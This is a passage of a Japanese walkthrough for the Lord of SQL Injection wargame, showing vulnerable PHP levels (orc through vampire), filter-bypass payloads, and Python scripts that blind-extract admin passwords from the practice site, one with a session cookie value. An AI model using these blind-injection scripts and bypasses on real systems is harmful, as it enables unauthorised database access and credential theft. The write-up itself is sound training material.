</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>さすがに全文字を書くのは辛いので，スクリプトを書いた．</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">'https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php'</span>
mycookie <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">''</span> <span class="token comment"># cookie</span>
<span class="token punctuation">}</span>
letters <span class="token operator">=</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters
ans <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> letter <span class="token keyword">in</span> letters<span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&quot;?pw=1' or id = 'admin' and substr(pw, {index}, 1) = \'{char}\'-- #&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index <span class="token operator">=</span> i<span class="token punctuation">,</span> char <span class="token operator">=</span> letter<span class="token punctuation">)</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>mycookie<span class="token punctuation">)</span>        
        <span class="token keyword">if</span> <span class="token string">'Hello admin'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            ans <span class="token operator">+=</span> letter
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h3 id="回答-4"><a href="#回答-4" class="header-anchor">#</a> 回答</h3> <p>上記スクリプトを走らせると，295d5844と出てくる．<br>
これを使う．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_orc <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">'295d5844'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="wolfman"><a href="#wolfman" class="header-anchor">#</a> wolfman</h2> <h3 id="問題-5"><a href="#問題-5" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/ /i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No whitespace ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_wolfman where id='guest' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;wolfman&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="考察-5"><a href="#考察-5" class="header-anchor">#</a> 考察</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/ /i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No whitespace ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>スペースが使えないので， &quot;/**/&quot;やタブを代わりに使う．
あとはidをadminにしてあげるだけ．</p> <h3 id="回答-5"><a href="#回答-5" class="header-anchor">#</a> 回答</h3> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_wolfman <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'guest'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">''</span><span class="token comment">/**/</span><span class="token operator">or</span><span class="token comment">/**/</span>id<span class="token operator">=</span><span class="token string">'admin'</span><span class="token comment">#'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="darkelf"><a href="#darkelf" class="header-anchor">#</a> darkelf</h2> <h3 id="問題-6"><a href="#問題-6" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/or|and/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_darkelf where id='guest' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;darkelf&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="考察-6"><a href="#考察-6" class="header-anchor">#</a> 考察</h3> <p>&quot;or&quot;，&quot;and&quot;が使えない．
代わりに&quot;ll&quot;を使う．</p> <h3 id="回答-6"><a href="#回答-6" class="header-anchor">#</a> 回答</h3> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_darkelf <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'guest'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">||</span> id <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token comment">#'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="orge"><a href="#orge" class="header-anchor">#</a> orge</h2> <h3 id="問題-7"><a href="#問題-7" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/prob|_|\.|\(\)/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/or|and/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_orge where id='guest' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;Hello <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$result</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/h2&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select pw from prob_orge where id='admin' and pw='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>pw<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;orge&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="考察-7"><a href="#考察-7" class="header-anchor">#</a> 考察</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;orge&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>この制約があるため，パスワードを得る必要がある．
まず,length()関数を使って文字数を確かめる．
以下のスクリプトを書いた．</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">'https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php'</span>
mycookie <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'461n04bqd0o3o43r8k4ckmb497'</span>
<span class="token punctuation">}</span>
letters <span class="token operator">=</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters
ans <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> letter <span class="token keyword">in</span> letters<span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&quot;?pw=' || substr(pw, {index}, 1) = \'{char}\' -- #&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index <span class="token operator">=</span> i<span class="token punctuation">,</span> char <span class="token operator">=</span> letter<span class="token punctuation">)</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>mycookie<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'Hello admin'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            ans <span class="token operator">+=</span> letter
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="回答-7"><a href="#回答-7" class="header-anchor">#</a> 回答</h3> <p>上記スクリプトから得られるパスワードを入れる．</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_orge <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'guest'</span> <span class="token operator">and</span> pw<span class="token operator">=</span><span class="token string">'6c864dec'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="troll"><a href="#troll" class="header-anchor">#</a> troll</h2> <h3 id="問題-8"><a href="#問題-8" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">ereg</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;admin&quot;</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;HeHe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_troll where id='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span>
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;troll&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="考察-8"><a href="#考察-8" class="header-anchor">#</a> 考察</h3> <p>&quot;admin&quot;以外．</p> <h3 id="回答-8"><a href="#回答-8" class="header-anchor">#</a> 回答</h3> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> id <span class="token keyword">from</span> prob_troll <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'ADMIN'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="vampire"><a href="#vampire" class="header-anchor">#</a> vampire</h2> <h3 id="問題-9"><a href="#問題-9" class="header-anchor">#</a> 問題</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
  <span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;./config.php&quot;</span><span class="token punctuation">;</span> 
  <span class="token function">login_chk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">dbconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;No Hack ~_~&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;admin&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;select id from prob_vampire where id='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">}</span></span>'&quot;</span><span class="token punctuation">;</span> 
  <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$query</span><span class="token punctuation">}</span></span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span><span class="token punctuation">;</span> 
  <span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;vampire&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
